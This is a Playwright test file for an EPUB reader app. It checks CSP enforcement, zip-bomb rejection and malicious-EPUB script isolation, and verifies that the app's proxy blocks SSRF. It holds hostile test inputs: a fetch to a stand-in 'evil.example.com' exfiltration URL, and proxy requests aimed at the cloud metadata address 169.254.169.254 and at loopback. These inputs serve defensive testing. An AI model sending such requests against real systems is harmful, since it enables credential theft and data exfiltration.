import fs from 'node:fs'
import path from 'node:path'
import { expect, test } from '@playwright/test'
import {
  createCleanEpubBuffer,
  createMaliciousEpubBuffer,
  createZipBombArchiveBuffer
} from '../fixtures/bookFixtures'

function buildCspHeaderFromTauriConfig(): string {
  const confPath = path.resolve(process.cwd(), 'src-tauri/tauri.conf.json')
  const conf = JSON.parse(fs.readFileSync(confPath, 'utf-8'))
  const cspObj = conf?.app?.security?.csp
  if (!cspObj || typeof cspObj !== 'object') {
    throw new Error('src-tauri/tauri.conf.json app.security.csp must be configured')
  }
  return Object.entries(cspObj)
    .map(([directive, value]) => `${directive} ${value}`)
    .join('; ')
}

test.describe('CSP, EPUB multi-layer isolation, Zip Bomb & Proxy security E2E (US3)', () => {
  test('enforces app CSP header with zero violations and keeps multi-chapter EPUB CSS/IMG/SVG intact while blocking XSS & zip bombs', async ({
    page
  }) => {
    const appCsp = buildCspHeaderFromTauriConfig()
    const cspViolations: Array<{ blockedURI: string; violatedDirective: string }> = []
    const blockedFontCdnRequests: string[] = []
    const evilOutboundRequests: string[] = []

    await page.route('**/*', async (route) => {
      const req = route.request()
      const url = req.url()
      if (url.includes('fonts.googleapis.com') || url.includes('fonts.gstatic.com')) {
        blockedFontCdnRequests.push(url)
        await route.abort()
        return
      }
      if (url.includes('evil.example.com')) {
        evilOutboundRequests.push(url)
        await route.abort()
        return
      }
      if (req.isNavigationRequest() && url.startsWith('http://127.0.0.1:4173')) {
        const response = await route.fetch()
        const headers = {
          ...response.headers(),
          'Content-Security-Policy': appCsp
        }
        await route.fulfill({ response, headers })
        return
      }
      await route.continue()
    })

    await page.addInitScript(() => {
      document.addEventListener('securitypolicyviolation', (e) => {
        ;(window as unknown as { __cspViolations?: unknown[] }).__cspViolations =
          (window as unknown as { __cspViolations?: unknown[] }).__cspViolations || []
        ;(window as unknown as { __cspViolations: unknown[] }).__cspViolations.push({
          blockedURI: e.blockedURI,
          violatedDirective: e.violatedDirective
        })
      })
    })

    await page.goto('/')
    await expect(page.locator('main h2', { hasText: '윤동주 시선' })).toBeVisible()
    expect(blockedFontCdnRequests).toHaveLength(0)

    // 1. Zip Bomb EPUB should be rejected safely with toast notification and zero library corruption
    const zipBombBuf = await createZipBombArchiveBuffer('too-many-entries')
    await page.locator('input[type="file"]').setInputFiles({
      name: 'zip-bomb.epub',
      mimeType: 'application/epub+zip',
      buffer: Buffer.from(zipBombBuf)
    })
    await expect(page.getByText(/도서 추가 실패/)).toBeVisible({ timeout: 10000 })

    // 2. Clean multi-chapter EPUB verifies <base> & CONTENT_CSP compatibility across styles/images/SVG
    const cleanBuf = await createCleanEpubBuffer({ title: '멀티챕터 에셋 검증책', author: '테스터' })
    await page.locator('input[type="file"]').setInputFiles({
      name: 'clean-assets.epub',
      mimeType: 'application/epub+zip',
      buffer: Buffer.from(cleanBuf)
    })

    const cleanCard = page.locator('main h2', { hasText: '멀티챕터 에셋 검증책' }).first()
    await expect(cleanCard).toBeVisible({ timeout: 15000 })
    await cleanCard.click()

    const cleanFrame = page.frameLocator('iframe').first()
    await expect(cleanFrame.locator('p.accent')).toContainText('깨끗한 첫 번째 챕터 본문입니다.', {
      timeout: 15000
    })

    await expect(cleanFrame.locator('p.accent')).toHaveCSS('font-weight', /^(bold|700)$/, {
      timeout: 10000
    })
    await expect(cleanFrame.locator('img.inline-art').first()).toHaveCSS('width', '24px')

    const assetCheck = await cleanFrame.locator('body').evaluate(() => {
      const imgs = Array.from(document.querySelectorAll('img'))
      const loadedImgs = imgs.filter((img) => img.complete && img.naturalWidth > 0).length
      return { imgCount: imgs.length, loadedImgs }
    })
    expect(assetCheck.imgCount).toBe(2)
    expect(assetCheck.loadedImgs).toBe(2)

    // Verify theme switching inside EPUB works under CSP
    await page.getByTitle('글꼴·테마·보기 방식 옵션').click()
    await page.getByRole('button', { name: '다크' }).click()
    await expect(page.locator('html')).toHaveClass(/theme-dark/)
    await page.getByTitle('닫기').click()

    // Clean app & multi-chapter EPUB must produce ZERO CSP violations
    const cleanViolations = await page.evaluate(
      () => (window as unknown as { __cspViolations?: Array<{ blockedURI: string; violatedDirective: string }> }).__cspViolations || []
    )
    expect(cleanViolations).toHaveLength(0)

    // 3. Malicious EPUB must trigger zero external requests and zero script execution
    await page.getByTitle('서재로 돌아가기').click()
    const evilBuf = await createMaliciousEpubBuffer()
    await page.locator('input[type="file"]').setInputFiles({
      name: 'evil-xss.epub',
      mimeType: 'application/epub+zip',
      buffer: Buffer.from(evilBuf)
    })
    const evilCard = page.locator('main h2', { hasText: '악성 EPUB' }).first()
    await expect(evilCard).toBeVisible({ timeout: 15000 })
    await evilCard.click()

    const evilFrame = page.frameLocator('iframe').first()
    await expect(evilFrame.locator('#safe-text')).toContainText('정상 본문 문단입니다.', {
      timeout: 15000
    })
    const evilEval = await evilFrame.locator('body').evaluate(() => {
      const w = window as unknown as Record<string, unknown>
      return {
        script: Boolean(w.__EVIL_SCRIPT_RAN__),
        onload: Boolean(w.__EVIL_ONLOAD__),
        svg: Boolean(w.__EVIL_SVG__),
        foreignObjects: document.querySelectorAll('foreignObject').length,
        scripts: document.querySelectorAll('script').length
      }
    })
    expect(evilEval).toEqual({
      script: false,
      onload: false,
      svg: false,
      foreignObjects: 0,
      scripts: 0
    })
    expect(evilOutboundRequests).toHaveLength(0)

    const allViolations = await page.evaluate(
      () => (window as unknown as { __cspViolations?: Array<{ blockedURI: string; violatedDirective: string }> }).__cspViolations || []
    )
    cspViolations.push(...allViolations)
    // Only pre-hook attacker <base href="https://evil.example.com/"> blocked by base-uri CSP may appear during malicious XML parsing
    const unexpectedViolations = cspViolations.filter(
      (v) => !(v.violatedDirective === 'base-uri' && v.blockedURI.includes('evil.example.com'))
    )
    expect(unexpectedViolations).toHaveLength(0)

    // 4. Root-app CSP connect-src must block arbitrary external http/https outbound fetch while keeping same-origin '/__remote_proxy' intact
    const connectOutcome = await page.evaluate(async () => {
      try {
        await fetch('https://evil.example.com/root-connect-exfil')
        return 'resolved'
      } catch (err) {
        return err instanceof Error ? err.message : String(err)
      }
    })
    expect(connectOutcome).not.toBe('resolved')
    expect(evilOutboundRequests.some((u) => u.includes('root-connect-exfil'))).toBe(false)

    const postConnectViolations = await page.evaluate(
      () => (window as unknown as { __cspViolations?: Array<{ blockedURI: string; violatedDirective: string }> }).__cspViolations || []
    )
    expect(
      postConnectViolations.some(
        (v) =>
          v.violatedDirective.startsWith('connect-src') &&
          v.blockedURI.includes('evil.example.com')
      )
    ).toBe(true)
  })

  test('blocks SSRF, cross-origin, and spoofed consent headers on /__remote_proxy', async ({
    request
  }) => {
    const badOrigin = await request.get('/__remote_proxy', {
      headers: {
        Origin: 'https://evil.example.com',
        'x-target-url': 'https://example.com/book.txt'
      }
    })
    expect(badOrigin.status()).toBe(403)

    const loopback = await request.get('/__remote_proxy', {
      headers: {
        Origin: 'http://127.0.0.1:4173',
        'x-target-url': 'http://127.0.0.1:8080/secret'
      }
    })
    expect(loopback.status()).toBe(403)

    const metadata = await request.get('/__remote_proxy', {
      headers: {
        Origin: 'http://127.0.0.1:4173',
        'x-target-url': 'http://169.254.169.254/latest/meta-data/'
      }
    })
    expect(metadata.status()).toBe(403)

    const mappedV6 = await request.get('/__remote_proxy', {
      headers: {
        Origin: 'http://127.0.0.1:4173',
        'x-target-url': 'http://[::ffff:169.254.169.254]/latest/meta-data/'
      }
    })
    expect(mappedV6.status()).toBe(403)
  })
})
